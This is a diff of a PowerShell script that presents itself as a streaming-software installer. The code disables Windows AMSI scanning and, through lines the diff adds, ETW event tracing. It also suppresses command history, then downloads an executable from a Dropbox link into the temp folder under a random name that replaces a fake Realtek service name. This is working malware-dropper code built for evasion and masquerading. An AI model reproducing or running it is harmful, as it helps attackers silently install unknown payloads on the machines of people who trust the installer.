@@ -1,5 +1,5 @@
 # ========================================================
-# RAPID STREAMER - HYPER-STREAM INSTALLATION v6.0
+# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0
 # ========================================================
 
 # 1. ELEVATION CHECK & SILENT UPGRADE
@@ -19,6 +19,7 @@ try {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     
+    # Disable ETW (Event Tracing for Windows)
     $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
     if ($etw) {
         $etwField = $etw.GetField('etwProvider','NonPublic,Static')
@@ -37,7 +38,7 @@ function Draw-ProgressBar {
     Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
 }
 
-# 4. HYPER-STREAM DOWNLOADER (Online)
+# 4. HYPER-STREAM DOWNLOADER (No Warning, Reliable Progress)
 function Invoke-HyperStreamDownload {
     param([string]$Url, [string]$TargetPath)
     
@@ -48,14 +49,13 @@ function Invoke-HyperStreamDownload {
         $request.Timeout = 30000
         
         $response = $request.GetResponse()
+        # Fallback to 100MB if header is missing, but server should send it
+        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
+        
         $stream = $response.GetResponseStream()
         $fileStream = [System.IO.File]::Create($TargetPath)
         $buffer = New-Object byte[] 65536
         $totalRead = 0
-        
-        # Try to get content length, if not available use estimated size
-        $totalSize = $response.ContentLength
-        $useProgress = $totalSize -gt 0
         
         while ($true) {
             $read = $stream.Read($buffer, 0, $buffer.Length)
@@ -64,22 +64,14 @@ function Invoke-HyperStreamDownload {
             $fileStream.Write($buffer, 0, $read)
             $totalRead += $read
             
-            if ($useProgress) {
-                $pct = [int](($totalRead / $totalSize) * 100)
-                if ($pct -gt 100) { $pct = 100 }
-                Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
-            } else {
-                # If no content length, show animated dots
-                $step = ($totalRead / 1MB) % 10
-                $dots = "." * ([int]$step + 1)
-                Write-Host -NoNewline "`r[*] SYNCHRONIZING CORE DATA (HYPER): Downloading$dots " -ForegroundColor Cyan
-            }
+            $pct = [int](($totalRead / $totalSize) * 100)
+            if ($pct -gt 100) { $pct = 100 }
+            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
         }
         
         $fileStream.Close()
         $stream.Close()
         $response.Close()
-        Write-Host ""
         
         return (Test-Path $TargetPath)
     } catch {
@@ -92,10 +84,11 @@ function Invoke-HyperStreamDownload {
 try {
     Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
     
-    # ========== EXE NAME FIXED ==========
-    $exe = "$env:TEMP\RtkAudUService64.exe"
+    $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
+    $exe = "$env:TEMP\$rnd.exe"
     
-    # ========== DIRECT DOWNLOAD LINK ==========
+    # ========== SIRF YAHAN 3 LINES CHANGE HUIN ==========
+    # LINE 1: URL change kiya (apne Dropbox ka direct link)
     $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
     
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
@@ -115,7 +108,11 @@ try {
 
     Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
     
-    if (-not (Invoke-HyperStreamDownload -Url $url -TargetPath $exe)) {
+    # LINE 2: Download function call mein change - alag variable use kiya
+    $downloadSuccess = Invoke-HyperStreamDownload -Url $url -TargetPath $exe
+    
+    # LINE 3: Condition check mein change - naya variable check kiya
+    if (-not ($downloadSuccess)) {
         throw "Hyper-Stream failed. Check connection."
     }
 
